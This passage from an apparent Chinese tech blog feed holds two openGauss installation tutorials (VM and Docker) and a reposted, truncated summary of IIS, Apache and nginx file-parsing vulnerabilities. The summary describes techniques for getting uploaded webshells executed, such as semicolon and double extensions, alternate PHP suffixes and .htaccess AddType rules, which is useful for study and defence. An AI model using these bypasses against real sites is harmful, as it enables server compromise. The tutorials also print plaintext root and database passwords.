键切换到编辑模式，复制内容黏贴到文档中，然后按下 esc 键退出编辑模式，然后输入<code>:wq</code>退出并进行保存</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;nodeNames&quot;</span> <span class="attr">value</span>=<span class="string">&quot; Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;sshIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line">下面的文档是全文，这里上面的东西只是标出需要对照修改的地方，方便看。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ROOT</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- openGauss整体信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CLUSTER</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;clusterName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dbCluster&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;nodeNames&quot;</span> <span class="attr">value</span>=<span class="string">&quot; Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;gaussdbAppPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/install/app&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;gaussdbLogPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/var/log/omm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;tmpMppdbPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/tmp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;gaussdbToolPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/install/om&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;corePath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/corefile&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;clusterType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;single-inst&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CLUSTER</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 每台服务器上的节点部署信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DEVICELIST</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- node1上的节点部署信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DEVICE</span> <span class="attr">sn</span>=<span class="string">&quot;1000001&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;azName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;AZ1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;azPriority&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 如果服务器只有一个网卡可用，将 backIP1和 sshIP1配置成同一个 IP --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;sshIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--dbnode--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;dataNum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;dataPortBase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26000&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;dataNode1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/install/data/db1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DEVICE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DEVICELIST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ROOT</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第零步：开 xshell 连我们的虚拟机，因为可以直接复制命令进去，安装 xshell 软件，打开，左上角文件然后新建</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010910.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010919.png"></p><p>点击连接即可，之后的命令都在 xshell 的终端里输入，可以从文档中复制然后进去右键粘贴</p><p>第一步：创建存放数据库安装目录，命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/software/openGauss</span><br></pre></td></tr></table></figure><p>下载数据库安装包:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://opengauss.obs.cn-south-1.myhuaweicloud.com/1.1.0/x86/openGauss-1.1.0-CentOS-64bit-all.tar.gz</span><br></pre></td></tr></table></figure><p>解压 openGauss-1.1.0-CentOS-64bit-all.tar.gz 包: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf openGauss-1.1.0-CentOS-64bit-all.tar.gz</span><br></pre></td></tr></table></figure><p>再解压 openGauss-1.1.0-CentOS-64bit-om.tar.gz 包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf openGauss-1.1.0-CentOS-64bit-om.tar.gz</span><br></pre></td></tr></table></figure><p>解压完成后输入 ls 看到如下</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011222.png"></p><p>更改权限： <code>chmod 755 -R /opt/software</code></p><p>做快照，xshell 跟虚拟机是同步的，所以此时虚拟机已经执行了上面的命令，所以可以建立快照，命名随便，准备安装</p><p>创建用户和组</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011254.png"></p><p>输入密码为 <code>openGauss</code></p><p>下面给 omm 用户授权</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011315.png"></p><p>开始安装</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011329.png"></p><p>安装成功无报错</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011339.png"></p><p>做快照</p><p>配置免密钥登录和操作系统参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh</span><br><span class="line">ssh-keygen -t rsa -f ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>连按两下空格生成结果如下</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011411.png"></p><p>下面将这些复制到一个文件里面并且测试不需要密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">ssh 192.168.1.142（ip地址）</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011436.png"></p><p>下面，配置<code>/etc/hosts</code>文件，<code>vi /etc/hosts</code> 进去以后加一行(vi 的操作都一样)，内容为 <code>“ip地址（三个空格）Aimerl0(之前配置的hostname)</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011502.png"></p><p>之后修改传输文件的最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* soft nofile 1000000&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line">echo &quot;* hard nofile 1000000&quot; &gt;&gt; /etc/security/limits.conf</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011527.png"></p><p>做个快照，之后开始正式安装，做完快照 reboot 重启一遍</p><p>输入 <code>su - omm</code>，再输入<code>gs_install -X /opt/software/openGauss/clusterconfig.xml</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011620.png"></p><p>之后要设置一个数据库的密码，<code>Aimerl0@123</code></p><p>安装过程有点久，而且期间要多次输入omm 用户的密码，输入之前设置的 <code>openGauss</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011655.png"></p><blockquote><p>如果有报错，跟下图不一样，恢复快照，reboot 重启，可能是虚拟机内存不够，然后再安装一遍，如果还不行，可能是物理机上的电脑内存不太够用，不太够分配给虚拟机了，重启电脑</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011748.png"></p><p>安装成功后建立快照</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011803.png"></p><p>终于成功了，这里输入的数据库密码是 <code>Aimerl0@123</code> ，omm 的密码是 <code>openGauss</code>，开机 root 账户密码是 <code>010625.</code></p><h1 id="openGauss-的简单实用"><a href="#openGauss-的简单实用" class="headerlink" title="openGauss 的简单实用"></a>openGauss 的简单实用</h1><p>这里假设，openGauss 已经启动（默认安装后，会启动，关机后的启动见后面），下面测试连数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su root 输入密码</span><br><span class="line">cd /opt/software/openGauss/script/</span><br><span class="line">./gs_checkos -i A</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011917.png"></p><p>之后进入 openGauss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - omm</span><br><span class="line">gs_om -t status -detail</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410012007.png"></p><p>查看端口信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/huawei/install/data/db1/postgresql.conf | grep port</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410012035.png"></p><p>可以看到26000是主结点端口号，使用 <code>gsql</code> 连接数据库，连接成功</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410012058.png"></p><p>接下来是数据库的使用，华为开源的 openGauss 数据库的内核采用的是 postgreSQL ，所以接下来的数据库操作、语法都遵循其语法，菜鸟教程里面有教怎么用，随便学学就会了</p><h1 id="关机后再开机，如何运行-openGauss"><a href="#关机后再开机，如何运行-openGauss" class="headerlink" title="关机后再开机，如何运行 openGauss"></a>关机后再开机，如何运行 openGauss</h1><p>也是先<code> su – omm</code>切换用户，然后<code>gs_om -t start</code>即可启动</p><p>连接数据库 <code>postgres</code> 的操作就是 <code>gsql -d postgres -p 26000</code></p><p>其中 <code>postgres</code> 是数据库名，openGauss 默认的数据库是 <code>postgres</code></p><p>如果有自己原先创建的数据库，改个名连接就行</p><blockquote><p>参考资料</p><p>学校老师发的官方文档（在本地）</p><p>本篇博客参考资料来自其他课号唐老师的安装指导文档：<a href="https://data.educoder.net/api/attachments/1562695">地址</a></p><p><a href="https://blog.csdn.net/qq_41619524/article/details/109722264">CentOS 7 下安装openGauss详细教程（单机或一主多从）以及部署一些问题_四岁小的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/whereiwillgo/article/details/107317991">openGauss数据库安装手册_whereiwillgo的博客-CSDN博客_opengauss安装指南</a></p><p><a href="https://www.modb.pro/db/27477">手把手带你快速安装openGauss - 墨天轮</a></p><p><a href="https://blog.csdn.net/ygp12345/article/details/107972011">openGauss保姆式安装说明_ygp12345的博客-CSDN博客</a></p><p><a href="http://www.cuug.com/index.php?s=/home/article/detail/id/2029.html">安装openGauss：执行安装及示例</a></p><p><a href="https://www.bilibili.com/video/av670496611/">轻松上手openGauss（程序员篇）之openGauss安装部署_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p><p><a href="https://www.modb.pro/db/33145">openGauss使用准备 - 墨天轮</a></p><p><a href="https://www.runoob.com/postgresql/postgresql-syntax.html">PostgreSQL 语法 | 菜鸟教程</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openGauss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openGauss-docker安装</title>
      <link href="/posts/31210/"/>
      <url>/posts/31210/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>用 VMware 搭 openGauss 有点点麻烦，百度后发现可以用 docker 直接起，所以再用 docker 搭一遍</p></blockquote><h1 id="搭建-CentOS-7-6"><a href="#搭建-CentOS-7-6" class="headerlink" title="搭建 CentOS 7.6"></a>搭建 CentOS 7.6</h1><p>步骤同用 VMware 搭建一样，随便搭搭就行</p><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><p>输入命令：<code>wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</code>更换阿里源</p><p>输入命令：<code>yum clean all</code>清除缓存</p><p>输入命令：<code>yum makecache</code>生成缓存</p><p>输入命令：<code>yum -y update</code>更新yum源</p><p>是个有点漫长的过程</p><h1 id="安个-python3、bzip2"><a href="#安个-python3、bzip2" class="headerlink" title="安个 python3、bzip2"></a>安个 python3、bzip2</h1><p>输入命令：<code>yum install python3 bzip2 -y</code></p><h1 id="关掉防火墙"><a href="#关掉防火墙" class="headerlink" title="关掉防火墙"></a>关掉防火墙</h1><p>输入命令：<code>systemctl stop firewalld.service</code>停止防火墙</p><p>输入命令：<code>systemctl disable firewalld.service</code>关闭防火墙</p><p><code>reboot</code>重启一下</p><h1 id="安装-docker"><a href="#安装-docker" class="headerlink" title="安装 docker"></a>安装 docker</h1><p>检查 Linux 版本，必须是 3.10 以上：<code>uname -r</code></p><p>输入命令：<code>yum install -y docker</code>安装 docker</p><p>输入命令检查 docker ：<code>docker -v</code></p><p>输入命令：<code>systemctl start docker</code>启动 docker 服务</p><p>输入命令：<code>systemctl enable docker</code>开机自启动 docker</p><p>停止 docker 命令：<code>systemctl stop docker</code></p><h1 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h1><h2 id="镜像操作命令"><a href="#镜像操作命令" class="headerlink" title="镜像操作命令"></a>镜像操作命令</h2><table><thead><tr><th align="center">操作</th><th align="center">命令</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">检索</td><td align="center"><code>docker search 关键字</code></td><td align="center">docker hub 上检索镜像的相关信息</td></tr><tr><td align="center">拉取</td><td align="center"><code>docker pull 镜像名:tag</code>，tag 是标签，一般是选择版本</td><td align="center"><code>:tag</code>可选项，默认为<code>latest</code></td></tr><tr><td align="center">列表</td><td align="center"><code>docker images</code></td><td align="center">查看所有本地镜像</td></tr><tr><td align="center">删除</td><td align="center"><code>docker rmi image-id</code></td><td align="center">删除指定的本地镜像</td></tr></tbody></table><blockquote><p>找镜像去 <a href="https://hub.docker.com/">https://hub.docker.com/</a> 找</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410113255.png"></p><h2 id="docker-加速"><a href="#docker-加速" class="headerlink" title="docker 加速"></a>docker 加速</h2><p>加快拉取速度可以配置镜像加速的服务器，阿里云镜像获取地址：<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors%EF%BC%8C%E7%99%BB%E9%99%86%E5%90%8E%EF%BC%8C%E5%B7%A6%E4%BE%A7%E8%8F%9C%E5%8D%95%E9%80%89%E4%B8%AD%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E4%B8%93%E5%B1%9E%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B8%8B%E6%96%87%E5%B0%B1%E6%98%AF%E9%85%8D%E7%BD%AE%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E7%9A%84%E6%96%B9%E6%B3%95">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors，登陆后，左侧菜单选中镜像加速器就可以看到一个专属地址，下文就是配置镜像加速器的方法</a></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410113646.png"></p><p>配置镜像地址，执行命令<code>vi /etc/docker/daemon.json</code>修改配置文件，如该文件不存在，则创建。在其中加入内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;registry-mirrors&quot;:[&quot;https://h9a56rl5.mirror.aliyuncs.com&quot;]&#125;</span><br></pre></td></tr></table></figure><p>依次执行命令<code>systemctl daemon-reload</code>和<code>systemctl restart docker</code>重新启动 docker</p><h1 id="拉取-openGauss-镜像并创建-openGauss-容器"><a href="#拉取-openGauss-镜像并创建-openGauss-容器" class="headerlink" title="拉取 openGauss 镜像并创建 openGauss 容器"></a>拉取 openGauss 镜像并创建 openGauss 容器</h1><p>选云和恩墨公司的镜像就行</p><p>执行<code>docker run --name opengauss --privileged=true -d -e GS_PASSWORD=Aimerl0@123 -p 6666:5432 enmotech/opengauss:latest</code>拉取镜像并创建容器</p><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><ul><li><p><code>run --name opengauss</code>：指定容器名字为 <code>opengauss</code>，并让 <code>opengauss</code> 容器跑起来</p></li><li><p><code>--privileged=ture</code>：容器内的 root 用户拥有真正的 root 权限，否则容器内的 root 只是外部的一个普通用户权限，开启此参数后，甚至可以在 docker 里面起 docker</p></li><li><p><code>-d </code>：后台运行容器，返回容器的 id，也称 <strong>启动守护式容器</strong></p></li><li><p><code>-e</code>：指定容器内的环境变量，也就是指定后面的密码</p></li><li><p><code>GS_PASSORD</code>：使用 openGauss 镜像的时候必须设置参数，不能为空或不定义，因为该参数是设置数据库内的超级用户<code>omm</code>以及测试用户<code>guassdb</code>的密码，openGauss 安装时默认会创建 <code>omm</code>超级用户，此用户名无法更改，测试用户<code>gaussdb</code>的起 docker 时候自定义创建的用户</p><p>此外，openGauss 镜像配置了本地信任机制，在容器内连接数据库无需密码，从容器外部连接数据库需要输入密码</p><p>再此外，openGauss 的密码有复杂度要求：<strong>密码长度8个字符以上，必须同时包含英文字母，数字，以及特殊符号</strong></p></li><li><p><code>-p</code>：指定一个端口映射，因为要用外部的数据库管理软件连接数据库，所以从容器内部的<code>5432</code>端口映射到外部的<code>6666</code>端口，密码是设置的环境变量<code>Aimerl0@123</code></p></li><li><p><code>enmotech/opengauss:latest</code>：拉取的镜像名字</p></li></ul><h2 id="未用到的参数解释"><a href="#未用到的参数解释" class="headerlink" title="未用到的参数解释"></a>未用到的参数解释</h2><ul><li><code>GS_NODENAME</code>：指定数据库节点名称，默认为 <code>guassdb</code></li><li><code>GS_USERNAME</code>：指定数据库连接用户名，默认为<code>gaussdb</code></li><li><code>GS_PORT</code>：指定数据库端口，默认为<code>5432</code></li></ul><p>之后执行<code>docker start opengauss</code>启动 openGauss 镜像</p><p>因为是上课用的，所以通过<code>docker update --restart=always opengauss</code>设置 openGauss 镜像随着 docker 的启动而启动</p><p>至此 openGauss 安装完成</p><h1 id="使用-openGauss"><a href="#使用-openGauss" class="headerlink" title="使用 openGauss"></a>使用 openGauss</h1><p>在 root 用户状态下使用连接命令连接数据库：<code>docker exec -it opengauss bash</code></p><p><code>su - omm</code>切换超级用户</p><p>执行命令<code>gsql</code>进入数据库</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openGauss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器解析漏洞小结</title>
      <link href="/posts/57799/"/>
      <url>/posts/57799/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>之前打靶机有利用到过一些解析漏洞，最近跟着涅普的视频过一遍基础，发现师傅整理出来的文章很不错，转载一下</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218003459.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218004849.png"></p><h1 id="一、IIS5-x-6-x解析漏洞"><a href="#一、IIS5-x-6-x解析漏洞" class="headerlink" title="一、IIS5.x-6.x解析漏洞"></a>一、IIS5.x-6.x解析漏洞</h1><p>使用<code>iis5.x-6.x</code>版本的服务器，<strong>大多为 windows server 2003</strong>，网站比较古老，开发语句一般为 <code>asp</code> ;该解析漏洞也只能解析 <code>asp</code> 文件，而不能解析<code>aspx</code>文件。</p><h2 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h2><p>目录名包含<code>.asp .asa .cer</code>这种字样，该目录下所有文件都被当做asp来进行解析<br>例如：在网站下创建文件夹名字为.asp、.asa的文件夹，其目录内的任何扩展名的文件都被IIS当做asp文件来解析并执行。<br>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p><h2 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h2><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg%EF%BC%88%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%89">www.xxx.com/xx.asp;.jpg（文件名）</a><br>原理：服务器默认不解析;号后面的内容，因此<code>xx.asp;.jpg</code>便被解析成asp文件了。</p><h2 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h2><p><code>IIS6.0</code> 默认的可执行文件除了<code>asp</code>还包含这三种 :<code>.asa</code> <code>.cdx</code> <code>.cer</code></p><p>例如：</p><ol><li><code>test.asa</code></li><li><code>test.cer</code></li><li><code>test.cdx</code></li></ol><h2 id="Iis7-5解析漏洞-php-ini开启cgi-fix-pathinfo"><a href="#Iis7-5解析漏洞-php-ini开启cgi-fix-pathinfo" class="headerlink" title="Iis7.5解析漏洞(php.ini开启cgi.fix_pathinfo)"></a>Iis7.5解析漏洞(php.ini开启cgi.fix_pathinfo)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php --&gt; /xx.jpg         //上传.jpg一句话，访问时后面加上/xx.php </span><br></pre></td></tr></table></figure><h1 id="二、apache解析漏洞"><a href="#二、apache解析漏洞" class="headerlink" title="二、apache解析漏洞"></a>二、apache解析漏洞</h1><h2 id="1-00截断上传漏洞"><a href="#1-00截断上传漏洞" class="headerlink" title="1. %00截断上传漏洞"></a>1. %00截断上传漏洞</h2><p><code>PHP 5.2</code> 存在截断上传 (0x00) (%00)，<code>PHP 5.3</code> 之后就没有了该漏洞</p><h2 id="2-多后缀解析"><a href="#2-多后缀解析" class="headerlink" title="2. 多后缀解析"></a>2. 多后缀解析</h2><p>一个文件名为 test.x1.x2.x3 的文件，Apache会从x3的位置往x1的位置开始尝试解析，如果x3不属于 Apache解析的扩展名，那么Apache会尝试去解析x2， 这样一直往前尝试，直到遇到一个能解析的扩展名为止。</p><p>例如：Web应用限制了php等敏感后缀，我们通过可以上传一个文件名为 <code>test.php.jpg</code> 的文件，访问时，Apache会因为无法解析jpg，而向前寻找可以解析的后缀，这时便找到php，那么按照php文件进行正常解析，从而使木马被执行。</p><h2 id="3-其他后缀解析"><a href="#3-其他后缀解析" class="headerlink" title="3. 其他后缀解析"></a>3. 其他后缀解析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><code>&quot;.+\.ph(p[345]?|t|tml)$&quot;</code> 该正则表达式匹配的不仅仅有php，还有php3、php4、php5、pht和phtml，这些都是Apache和php认可的php程序的文件后缀。如果网站仅对php进行了防护，那么我们可以改为这些不大常见的后缀，同样完成解析。</p><p>例如：<code>test.php3 、 test.pt 、 test.ptml</code></p><h2 id="4-htaccess解析"><a href="#4-htaccess解析" class="headerlink" title="4.  .htaccess解析"></a>4.  .htaccess解析</h2><blockquote><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。</span><br></pre></td></tr></table></figure><p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入：<code>AddType application/x-httpd-php xxx</code> ，这时上传<code>.xxx</code>后缀的文件，就会当成php解析。</p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>当Web应用匹配到名为 test.jpg 文件时，同样会当成php解析。</p><h1 id="三、nginx解析漏洞"><a href="#三、nginx解析漏洞" class="headerlink" title="三、nginx解析漏洞"></a>三、nginx解析漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Nginx 默认是以 CGI 的方式支持 PHP 解析的，普遍的做法是在 Nginx 